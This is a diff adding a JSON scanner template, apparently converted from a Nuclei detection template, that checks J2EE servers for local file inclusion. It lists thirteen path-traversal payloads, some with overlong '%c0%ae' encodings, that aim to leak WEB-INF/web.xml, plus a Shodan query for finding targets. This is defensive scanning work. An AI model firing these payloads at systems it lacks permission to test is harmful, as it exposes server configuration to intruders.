@@ -1,0 +1,176 @@
+{
+  "id": "generic-j2ee-lfi",
+  "name": "Generic J2EE LFI Scan Panel - Detect",
+  "author": "davidfegyver",
+  "severity": "HIGH",
+  "description": "Generic J2EE Scan panel was detected. Looks for J2EE specific LFI vulnerabilities; tries to leak the web.xml file.",
+  "references": [
+    "https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LFIModule.java",
+    "https://gist.github.com/harisec/519dc6b45c6b594908c37d9ac19edbc3"
+  ],
+  "tags": [
+    "lfi",
+    "generic",
+    "j2ee"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.title:\"J2EE\""
+  },
+  "variables": {
+    "paths": [
+      "/../../../../WEB-INF/web.xml",
+      "/../../../WEB-INF/web.xml",
+      "/../../WEB-INF/web.xml",
+      "/%c0%ae/%c0%ae/WEB-INF/web.xml",
+      "/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml",
+      "/%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml",
+      "/../../../WEB-INF/web.xml;x\u003d",
+      "/../../WEB-INF/web.xml;x\u003d",
+      "/../WEB-INF/web.xml;x\u003d",
+      "/WEB-INF/web.xml",
+      "/.//WEB-INF/web.xml",
+      "/../WEB-INF/web.xml",
+      "/%c0%ae/WEB-INF/web.xml"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}{{paths}}",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\u003cservlet-name\u003e",
+            "\u003c/web-app\u003e"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "generic-j2ee-lfi",
+    "info": {
+      "name": "Generic J2EE LFI Scan Panel - Detect",
+      "author": "davidfegyver",
+      "severity": "high",
+      "description": "Generic J2EE Scan panel was detected. Looks for J2EE specific LFI vulnerabilities; tries to leak the web.xml file.",
+      "reference": [
+        "https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LFIModule.java",
+        "https://gist.github.com/harisec/519dc6b45c6b594908c37d9ac19edbc3"
+      ],
+      "metadata": {
+        "max_request": 13,
+        "shodan_query": "http.title:\"J2EE\""
+      },
+      "tags": "lfi,generic,j2ee"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "paths": [
+            "/../../../../WEB-INF/web.xml",
+            "/../../../WEB-INF/web.xml",
+            "/../../WEB-INF/web.xml",
+            "/%c0%ae/%c0%ae/WEB-INF/web.xml",
+            "/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml",
+            "/%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml",
+            "/../../../WEB-INF/web.xml;x\u003d",
+            "/../../WEB-INF/web.xml;x\u003d",
+            "/../WEB-INF/web.xml;x\u003d",
+            "/WEB-INF/web.xml",
+            "/.//WEB-INF/web.xml",
+            "/../WEB-INF/web.xml",
+            "/%c0%ae/WEB-INF/web.xml"
+          ]
+        },
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}{{paths}}"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\u003cservlet-name\u003e",
+              "\u003c/web-app\u003e"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
